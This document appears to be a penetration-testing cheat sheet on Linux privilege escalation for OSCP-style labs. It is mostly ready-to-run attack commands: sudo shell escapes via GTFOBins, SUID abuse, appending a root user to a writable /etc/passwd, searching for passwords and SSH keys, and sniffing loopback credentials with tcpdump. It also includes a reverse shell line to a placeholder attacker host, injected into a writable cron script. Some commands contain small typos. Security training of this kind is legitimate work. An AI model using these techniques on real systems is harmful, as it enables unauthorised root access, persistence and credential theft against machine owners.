# Linux Privilege Escalation

## Linux Privilege Escalation

If you’ve got a foothold on a Linux target during OSCP-style enumeration, here’s a no-nonsense walkthrough of techniques I use to go from low-priv user to root.

***

## Automated Enumeration Tools

```sh
# linPEAS (best all-in-one)
./linpeas.sh

# LinEnum (quick recon)
./LinEnum.sh

# Linux Exploit Suggester
./linux-exploit-suggester.sh
```

> Use these when you're stuck or want to double-check your manual recon.

{% hint style="warning" %}
While automated scans are useful, starting with a manual sweep is often quicker and more efficient.
{% endhint %}

## Manual Enumeration

### Initial Enumeration

```sh
# Identify system, kernel, and architecture
whoami && id
uname -a
cat /etc/os-release
lscpu
hostname
```

```sh
# Users, groups, and history
cat /etc/passwd
cat /etc/group
cat ~/.bash_history
```

```sh
# Network discovery
ip a
ip route
netstat -tunlp
```

```sh
# Check sudo permissions
sudo -l
```

***

### Sudo Privileges (GTFOBins)

```sh
# If any common binaries are listed in sudo -l, check GTFOBins
sudo find . -exec /bin/sh \; -quit
sudo vim -c ':!sh'
sudo awk 'BEGIN {system("/bin/sh")}’
sudo less /etc/passwd  # then use !/bin/sh
```

> Check [https://gtfobins.github.io/](https://gtfobins.github.io/) for payloads tied to your allowed binaries.

***

### SUID Binaries

```sh
# Find binaries with SUID bit set
find / -perm -4000 -type f 2>/dev/null
```

> If you find something like `bash`, `find`, `cp`, or `python`, check GTFOBins for how to abuse them. Example:

```sh
./bash -p
```

***

### Writable /etc/passwd

```shell
# If /etc/passwd is writable, generate a root hash
openssl passwd -1 w00t

# Append a new root user
echo "root2:<HASH>:0:0:root:/root:/bin/bash" >> /etc/passwd

# Switch user
su root2
```

***

### Crontab + Writable Scripts

```shell
# List all cron jobs
ls -la /etc/cron*
crontab -l
```

> If a script run by cron is writable:

```shell
echo "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" >> /path/to/script.sh
```

***

### Password Hunting

```sh
# Hardcoded or leaked passwords
grep -iR "password" / 2>/dev/null
find / -name id_rsa 2>/dev/null
```

```shell
# .bash_history and config files
cat ~/.bash_history
find / -name '*config*' 2>/dev/null
```

***

### Kernel Exploits

```sh
# Kernel info
uname -r
```

```shell
# Use exploit suggester
linux-exploit-suggester.sh
```

```shell
# Compile and run exploit
gcc exploit.c -o exploit
./exploit
```

> Try kernel exploits only if everything else fails.

***

### Environment Variables & User Trails

```shell
# Check env vars for secrets
env | grep -i pass

# Also check .bashrc or init scripts
cat ~/.bashrc
```

***

### Capabilities and setcap

```shell
# Find binaries with Linux capabilities
getcap -r / 2>/dev/null
```

> If `cap_setuid` is set on `python`, `perl`, or `bash`, you can likely escalate via GTFOBins method.



***

### ⚡ Bonus: TCPDump Credentials via Loopback

```sh
# If you can run tcpdump with sudo
sudo tcpdump -i lo -A | grep pass
```

> This dumps loopback traffic. Sometimes web creds are sent locally.

***

### Check These Too

```sh
# World writable files/dirs
find / -writable -type d 2>/dev/null

# Mounted disks
mount
lsblk
cat /etc/fstab

# Loaded kernel modules
dsmod
/sbin/modinfo <module>
```

